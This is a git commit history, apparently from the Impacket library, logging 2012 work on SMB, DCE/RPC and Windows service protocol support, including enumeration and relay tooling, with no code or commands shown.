Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 22 23:33:36 2012 +0000

    I just saw an answer from a server that doesn't have the reserved field in zero (contrary to the protocol specification). Since it's not used, we're just letting the structure to hold whatever value is received.

commit 7ddb494c04ce2867c333d48829c9751358775f4c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 21 18:50:46 2012 +0000

    At logoff, receive the servers's answer and clear the uid field, in case client wants to login again using the same connection

commit 255f7a802a05182b044b95a7c34fb873df518439
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 21 15:39:40 2012 +0000

    If we change to a different share, clear the pwd local variable

commit abf579ccd0a288ca780a23c0434e84814cf8c114
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 15 20:00:07 2012 +0000

    Added get_timeout() method to the SMB class

commit 5b6667f4a198e3114cbf14fe9cac4c9b74db6e61
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 9 05:45:33 2012 +0000

    Fix typo on all SMBSessionSetupAndX* definition. Unicode ('u') must be used instead of NDR ('w').

commit 61c7a29157fd2d2ab3683f63112e32285f1de8a5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 2 01:22:08 2012 +0000

    Just making the example to work

commit d13b6c58b49fa0e55129baa37f04eecadb222f18
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 2 00:33:57 2012 +0000

    Removed parsing data inside the payload of a SMBNTLMDialect_Data(). I added this in revision 294, but triggers an exception on some weird Windows configurations. ServerName is grabbed later on at the login stage, in a much safer way.

commit 509aa4bd585289ce69887c6b455c4304e3fea7e2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 25 05:17:13 2012 +0000

    1) Missing '<' in LSARPCLookupSids'd LookupLevel Field
    2) Added LSARPCLookupSids3 structure

commit 357c11ec7f02310f42832275587c7e763b1cbe2b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 13:56:36 2012 +0000

    Example now grabs the Scheduled tasks through SchRpcEnumTasks(), much better since it will grab them all (contrary to the old NetrJobEnum() ). Example yet not fully functional, just committing for backup

commit 7bae66d5edf82ca2860bf01d7fc3197066a9cd8d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 13:51:39 2012 +0000

    1) Fixed bug in MSRPCBindAck when SecondaryAddrLen is 0, SecondaryAddr should be optional
    2) When doing alter_ctx, keep track of the previous callid

commit 1ac3783599ac71e3581909630c14312c9ae42e91
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 04:01:28 2012 +0000

    if SMBTransport.disconnect() is called, and no previous smbserver was provided to the transport, clear self.__smb_server, in case a new SMBTransport.connect() is wanted

commit 82a21e94a7409fc136d61181b3821f8c05ab5887
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 03:28:17 2012 +0000

    Added Method SchRpcEnumTasks()

commit e778256d6514680657aedd4d6b48bb90b754e327
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 01:12:17 2012 +0000

    Example for the ATSVC dcerpc methods. So far it:
    1) Creates an schedule task
    2) Enums the tasks created for the user

commit ee81a9c3a21fb65525c7632df507437ee710060a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 01:10:13 2012 +0000

    First implementation of the ATSVC ([MS-TSCH]) methods:
    1) NetrJobAdd()
    2) NetrJobEnum()

commit 7a78b6a41bfcb235c723ee1dbc42ea1889e2d012
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 20 23:16:59 2012 +0000

    Small example for SPOOLSS, now it's only enumerating printers (Level1)

commit 7d526a6140f299897359bb5583f121477d6021a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 20 23:12:24 2012 +0000

    1) Adding SPOOLSS UUID
    2) EnumPrinters now returns data

commit 73a44c7e5c5c25a82fd569790667042398d600ff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 17:39:57 2012 +0000

    We're not updating the Changelog anymore.. google code can do that :)

commit 6c3c1cbf475b3ad5ca64fa69243b304d869f0172
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 17:32:45 2012 +0000

    update

commit 060964bc775b7279d3d8b1b582329de84075c06e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 17:05:16 2012 +0000

    1) Added support for shell commands thru '!'
    2) Share's list first done through SRVSVC, if it fails, falls back to LANMAN

commit 3422aaa3e82c71c31d28e11ec1293d5a80026a39
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 01:53:42 2012 +0000

    Small fix on negTokenResp when parsing negResults with no extra data

commit 97f0b6d1b777a2d6c8322afdb7f70e032096b2b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 01:51:25 2012 +0000

    SPNEGO test case. We should add more tests in here

commit 2a9ab2071c5f7551f175e8fb35b2f917f2694182
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 12 18:58:59 2012 +0000

    Adapting smbrelayx to svcctl exception handling previously committed

commit c578f9fc2dd64122dce69b66b831528112078a29
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 12 18:31:15 2012 +0000

    Added the ability to use external srvsvc dcerpc server. Disabled by default. Uncomment lines in simple_server.py to test it.

commit 7165090b7860d4e0201e4a2364d1eb7d8799e8a0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 12 18:29:18 2012 +0000

    A minimalist DCE RPC Server, just for the purpose (for now)
    of making smbserver to work better with Windows 7, when being asked
    for shares

commit bdb995f37fb25866479a3b09c2241d37f4fdc21f
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 10 02:00:56 2012 +0000

    In the context of issue 7 reported by oss@divinehawk.com, we fixed TCP parser to avoid get stuck while parsing TCP options.
    Also we added a testcase to support this case.

commit cd7c71fa7bab0c374e2248ffce77b3fb6cf59c33
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 9 23:17:25 2012 +0000

    If CAP_LARGE_WRITE or CAP_LARGE_READ are enabled and the communication is not signed, we increase the buffers for read and write to speed up performance.

commit 26e70b4cd86b64e7eea35a3f313148b2ba556980
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 18:53:28 2012 +0000

    Ability to resume an enumusers call if many entries are returned

commit 19482fe37e4a7d931846c284b612829557750b1b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 18:37:57 2012 +0000

    Changing permissions when opening target LsaR

commit 134a29978dde25e959599f054c1c0becc0ded477
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 18:26:07 2012 +0000

    Where there are many users in the target machine, there should be a way to continue the search. Added that possibility to the enumusers() method.

commit 19ddf71ec1f88fafc02eacf7b14f9f113f603cb3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 13:21:28 2012 +0000

    RefId random value CANNOT include 0

commit c06870d0a8739e08338c63be0642cf3dc829bccd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 13:21:02 2012 +0000

    1) Fixed padding issue in DOMAIN_INFORMATION
    2) doRequest now checks whenever the DCE call triggered an error by default (some functions explicitly set is to False)
    3) RefId random value CANNOT include 0

commit b49cf12f72f8ae1efe9eb62ae2fd8ac142362313
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 04:06:37 2012 +0000

    Now it does bruteforce. MaxRid parameter sent thru command line.

commit 877c89e7a436c84d98cf1315e85091bd718d0bfb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 04:03:09 2012 +0000

    1) alignment in LsaLookupSid struct not needed
    2) Better handling for LSARPCLookupSidsResponse.formatDict() when some of the answers are NULL pointers (e.g. some SIDs NOT_MAPPED).
    
    That whole LSARPCLookupSidsResponse.formatDict() should be rewritten.. I don't like the way it was implemented.

commit 4549684a78288bbb9cbd968ae3de7b801f5a1180
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 00:36:42 2012 +0000

    First implementation of lookupsid brute forcing.. still not bruteforcing a thing ;)..

commit 8d926970b6e7ead17dce9abebb7387895c16ef38
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 00:35:02 2012 +0000

    1) Added LSARPCSessionError Exception, still left to print the NT Status code
    2) Added LsarQueryInformationPolicy2 call

commit 646a668790e44aada75a810f1db22d28f7efdee3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 1 23:20:26 2012 +0000

    UUIDs for each endpoint now in readable form

commit b12247b9147c2ae92e1fb8c248ea52fb4afff5f7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 1 23:11:16 2012 +0000

    Avoid opening a dummy servicename when asking for LIST action

commit a481520586f586184a08b898be6d5d2f2b299415
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 29 21:39:46 2012 +0000

    Setting svn:keywords "Id" on all files

commit dfbfabf0c55227790eaf04e9f2b6fb8d3b51e10e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 29 21:30:27 2012 +0000

    Copyright update

commit 4538240fcce1e32e878147f30296efabd5e3d7a0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 29 21:04:38 2012 +0000

    Copyright updates

commit 086817b3fc0aa8ac1180a4b17acbf0168eeab403
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 29 20:41:05 2012 +0000

    1) Added capability to get the SID Type when parsing lookupSid response (thanks lanjelot!)
    2) Fixed a padding issue when parsing the odd domainnames

commit abe7b092e7182a62a2be0e69bc0c92c5893705bf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 17 13:07:49 2012 +0000

    doRequest now throws an SVCCTLSessionError Exception when the RPC call fails, dumping the right error.
    This means all the exposed function will throw an Exception when an error is found.

commit 78c8f005522e9ba8d2a979f997292e6dbdcecae0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 12 21:51:26 2012 +0000

    Removed debug message

commit 1552df235136b657d10c939b1830b5f35e5076a7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 12 20:55:38 2012 +0000

    Fixed wrong detection of an existing smb_server, resulting in disconnecting it when disconnect() was called

commit 1fdd49d8566542cc5b199bf25992a6df1f56082f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 9 19:46:31 2012 +0000

    Adding the ability to set up transport's connection timeouts programmatically

commit 8d0deabb2600b9d4eaa1b62ae1616377c09abd4f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 9 19:15:10 2012 +0000

    Fixed previous smb.py commit bug in set_flags()

commit 5f75480b08545c2fe81b57e6949a4d4cb44f7c7e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 9 19:03:32 2012 +0000

    Fixes bug introduced in previous version triggered when targeting port 139

commit 8ac46fec6b5c302430bcee8ac1f1a7a69915d57d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 9 16:41:09 2012 +0000

    Added set_flags() and and get_flags() methods for the SMB class

commit 9d27274a2ad0f8395bb04c055b23119339e558b8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 8 21:48:29 2012 +0000

    Merge from Impact Engineering team changes to Impacket

commit 9f31cc6e39782887f0207337f1b67a67f2b9ae10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 8 15:08:20 2012 +0000

    select_poll can be configured from SMBSERVERHandler()

commit a40db80c8cf1aa89d1578b02b151cc2b2ba19523
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 8 11:56:29 2012 +0000

    Simpler way to switch between select_poll mode and normal mode, in the __read function. Applying patch from Martin.

commit 0f8c83b083f4ce7a3641f543fd75144ed0842245
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 8 11:44:42 2012 +0000

    Fixed bug when handling old MSRPCHeader packets.. Now it should work with both versions

commit 1034ff6dea7744f2f8862bb66efa286647b589b3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 5 18:51:07 2012 +0000

    Fixed '=' for '=='.. dumb me :p

commit 5ab9271061e922f03ee27211ee62c17ce14facdb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 5 16:20:54 2012 +0000

    Added select_poll option, another way to make select of a socket

commit ee77f56d253bc9f2ab75858a368aec60b0195398
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 3 03:19:35 2012 +0000

    Added SMB_FIND_FILE_ID_BOTH_DIRECTORY_INFO and SMB_FIND_FILE_ID_FULL_DIRECTORY_INFO information level support for findfirst2

commit 5ed088613abbe491818bc8b468b7f522afd3733b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 3 01:51:57 2012 +0000

    Removed debug message and converted received share to uppercase

commit 1fed9fa238e5d148c815b363ec3bd9496deccc54
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 3 01:30:43 2012 +0000

    Added LanMan NetShareGetInfo call

commit 831c73f10758dad019cf0d518086cf1e936832d0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 22:10:54 2012 +0000

    Added support for extended reponses when client does a treeconnectandx

commit e78e84e44c39526a1a4791fc7bbb2cb637ad2209
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 22:09:43 2012 +0000

    Added SMBTreeConnectAndXExtendedResponse_Parameters structure

commit 5362f5f1ed0c42c529aec4d8d4773465fe23b383
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 20:47:21 2012 +0000

    Added SMBNtCreateAndXExtendedResponse_Parameters structure

commit 6734830b7ec96f024464c42431e991f92ed5a171
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 15:31:47 2012 +0000

    Added SRVSVCServerInfo101 and SRVSVCServerpInfo101 structures

commit 0ebf3d59f2f522ad9e7044ec79d3e69c4f239fa4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 14:04:17 2012 +0000

    Added support for LANMAN SMBNetServerGetInfo

commit 9046ab3d1548abb8cea24c8b8e2202d7d0630a2f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 14:03:26 2012 +0000

    Added SMBNetServerGetInfoResponse and SMBNetServerInfo1 structures

commit 9918b7b8fcbcbfaed493cf778fecf37b9bce11be
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 03:21:04 2012 +0000

    Minor changes on SRVSVCShareEnumStruct and SRVSVCNetrShareEnum1_answer setting some default values

commit f729ccdb964777e9ddf783e2b68356cbeb2fa4c3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 02:53:15 2012 +0000

    Small change to SRVSVCNetrShareEnum structure so it gets easier to parse an
    incoming request

commit 5fe0da82664d4b691c0bb23d8b1a00d0a7392b34
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 1 22:01:53 2012 +0000

    Small change to SRVSVCNetrShareEnum structure so it gets easier to parse an incoming request

commit 0d23860f1c95abdf58014d587407c955a590261e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 1 15:02:47 2012 +0000

    registerNamedPipe() receives an address instead of a socket. Socket is created/connected once a NTCreateAndX request is received.

commit 2643fab7d0c54ffe4d63b6d0f865f0a00130a11e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 1 14:15:27 2012 +0000

    Added transactNamedPipe() to smbserver

commit 979bc8c47b009ae9bc51ad4da461755c98608dc4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 1 14:11:35 2012 +0000

    Setting some default values for structures

commit 66868d46aec642b7744873a76f57b6bc8f1c4f4e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 29 17:49:25 2012 +0000

    1) Updated NT Error Messages strings.
    2) Changed SessionError Exception message format
    3) Changed SmbPacket (old version) structure to it also grabs the reserved field that is part of the NT Error Code

commit 1e5ee07ea0e380cb1bda83c0c13251551c0bbfdb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 28 23:18:03 2012 +0000

    Implemented registerNamedPipe() allowing to register NamedPipes (e.g. srvsvc) to a socket. Currently implemented in smbComRead/Andx, smbComWrite/Andx and NTCreateAndX (still pending transactions). Every read/write request will be sent to the registered socket, allowing to have a third party RPC Server answering those requests.

commit 88874e6765f8daba569247f83020e4309721bf74
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 28 13:03:35 2012 +0000

    Fixed bug where lm/nt hashes were cleared before sending the for authentication, actually breaking it. Thanks Bernardo for reporting this!

commit 19e479923c82f2f1e7a71180ccbc79f6af816a94
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 27 22:07:41 2012 +0000

    Fixes Issue: http://code.google.com/p/impacket/issues/detail?id=9
    
    Thanks to thebigguy.co.uk

commit b69f4d483e58d633142f33a2271c6576b6980417
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 27 20:59:10 2012 +0000

    Support for argument passing for StartServiceW(). Testing still needed

commit 7082864e8b863a16c005106915803d1cda36621f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:48:46 2012 +0000

    Added downgrade exception if Samba is also detected. If not some of those OSes, then raise the exception

commit 72e3e163603147323c7ab0e34a5ca5fddc8f835c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:39:08 2012 +0000

    Added doesSupportNTLMv2(). Now just downgrading to NTLMv1 whenever we find a target Windows 2000 (I gotta test Samba)

commit ef28649f3567ae74939da603a3987771ff3924b8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:38:00 2012 +0000

    When authenticating, now asks the higher transport about whether or not to use NTLMv2 (through self._transport.doesSupportNTLMv2()). This is the best effort we can do against old Windows systems (and probably Samba)

commit c69fe6587ac7de25ac63ee2dc08750ba47e6e91d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:35:32 2012 +0000

    Adding doesSupportNTLMv2() method so underlying RPC instances can ask for it when authenticating. Right now it would work only for SMB Transports since there is the only place we can figure out this setting.

commit 7a2c8c494691a6f3f089ff7780001a0c0f4f1d4b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:34:26 2012 +0000

    Using NTLMv2/V1 can now be set programmatically

commit 4a5b87d308d5e7c19e434cf94ccefbc2d7a4970b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 18:21:21 2012 +0000

    Using NTLMv2/V1 can now be set programmatically

commit 968b81c5c0b323a699ddd59f4228c4d5b4e201c5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 18:10:02 2012 +0000

    A few NT error codes added

commit e7d01b5b59b9dc8508afb21d97eebfbaaaa78253
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 18:09:43 2012 +0000

    Using NTLMv2/V1 can now be set programmatically

commit 4b7633fbb9b7242a883f37beeb29175c6b6c60f3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 23 21:24:33 2012 +0000

    If the server received a NetBios Session Request, it will answer with a NETBIOS_SESSION_POSITIVE_RESPONSE, meaning now this could be use in port 139 as well.

commit c7f4fdbfca6ea22398e6fffa743177de128afe95
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 23 15:13:44 2012 +0000

    Initial lsarpc implementation by Pablo

commit bf0225f6ef9d472481b7a39558b9aaac7c467a4f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 17 16:50:00 2012 +0000

    More custom settings if run on a win32 platform

commit 73ad20bb4ff2026866ee4237a9a79d89a2c21188
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 17 15:59:41 2012 +0000

    FIND_NEXT was missing a trailing NULL byte in the filename

commit 8abbe4b2ddd61263f758b67fbb67bd9879efbb72
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 16 20:37:47 2012 +0000

    Tweaked some methods to handle being used from a win32 platform

commit 87a412f8693da7662ed54a90ed2ff198d9480d17
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 16 19:43:40 2012 +0000

    Ability to specify and already crafted configParser

commit e7a2b6afe0cd794ce8fa38103fe053b38b9005b4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 16 15:02:22 2012 +0000

    If destination port SMB_SESSION_PORT and remote name *SMBSERVER, we're changing it to its IP address

commit 9df080feb015120c6b113bb18a28740ce81863c7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 15 21:48:05 2012 +0000

    If destination port != 139, don't use *SMBSERVER 'cause it will ask for the target netbios name, and that takes time when it's not really needed.

commit 65ea16a332a38574d4abfa82fc63e35765aad5ac
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 15 21:37:33 2012 +0000

    1) Added pipe disconnected NT error
    2) Fixed bug in TransactNamedPipe() when parsing the answer

commit 5e020bb6da9ce2891d29e41167420552bd4e6005
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 14 22:31:40 2012 +0000

    Fixed an error in StartServiceW() introduced in r455. Falling back to the original structure. Still doesn't parse commands, that's pending.

commit 60b871c3f573a92835f22a15e5d1cd56e9417333
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 13 22:04:26 2012 +0000

    GetMembersInAlias() now working.. needs some testing.. Interesting data in the answer['EnumerationBuffer'].

commit a91cc8b42a46aa749348fe5978963c9a17963311
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 13 20:10:03 2012 +0000

    fromCanonical method added to SAMR_RPC_SID() to simplify SIDs manipulation.
    
    e.g:
    
    sid = samr.SAMR_RPC_SID()
    sid.fromCanonical('S-1-5-4')
    str(sid)

commit 96521603a1ec1b616f76718f1641cb56437e5e82
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 13 19:22:55 2012 +0000

    Added:
    1) OpenAlias
    2) GetMembersInAlias
    3) SID Parsing and canonical printing
    
    Still need to be tested

commit dd7bb98ca08c8f1c4e776c8008d50fa50dbdd3e7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 13 13:55:02 2012 +0000

    Quick and dirty fix so it now supports bash like history (using cmd.Cmd)

commit 2965bb784992e62640b4304a6a113d5e8fb4ec6d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 22:34:23 2012 +0000

    Support for multiple answers for NetrWkstaTransportEnum()

commit 404d6b3d4b34c6992a0e108ace824a62ef65c079
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 22:33:32 2012 +0000

    Support for more than 1 item in the answer array (sometimes it happens, especially with w2k machines)

commit 33fbce54e6733ec28e055b6d25d95765696e8df2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 21:56:15 2012 +0000

    Forcing smbclient to use tree_connect_andx

commit 69d95c5a927354e50f6c04c3c61144162205d8c3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 21:34:54 2012 +0000

    Small script to test wkssvc.py

commit e7f4988c49c327b917207766aef9f065571410c0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 21:22:19 2012 +0000

    First implementation of Workstation Service. Implemented NetrWkstaTransportEnum() for retrieving target systems MAC address and Interface Information

commit e023c89b103c60f181e241c147df2929bed1bbcd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 17:31:30 2012 +0000

    Added EnumerateAliasesInDomain(). For now it returns a list of dcerpc.MSRPCArray
    
    We should port those NDR funtions to structure in the future

commit 836c36aa5a7aa3b5e68cea630411ab18bcd931e8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 16:06:14 2012 +0000

    adding a self.rawData variable that hold the original buffer sent to Structure, so it can be used inside the structs to calculate lengths.

commit 48f5eb3cbc5031fe9947cbbed4f152119d8c1f64
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 26 15:19:46 2012 +0000

    Not retrieving the Strings if the call returned an error. It's caller's reponsibility to check that result as well whenever printing the data returned.

